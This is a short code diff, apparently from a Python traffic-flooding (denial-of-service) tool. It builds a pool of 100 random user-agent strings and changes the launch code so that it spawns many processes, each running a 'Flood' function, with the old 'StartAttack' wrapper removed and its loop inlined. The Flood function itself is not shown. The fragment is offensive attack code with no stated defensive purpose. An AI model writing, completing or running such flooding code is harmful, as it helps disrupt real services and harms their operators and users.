@@ -145,10 +145,8 @@ userAgentList = []
 for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
-def StartAttack():
-    for _ in range(threadNumber):
-        thread = multiprocessing.Process(target=Flood)
-        thread.setDaemon = False
-        thread.start()
-StartAttack()
+for _ in range(threadNumber):
+    thread = multiprocessing.Process(target=Flood)
+    thread.setDaemon = False
+    thread.start()
 
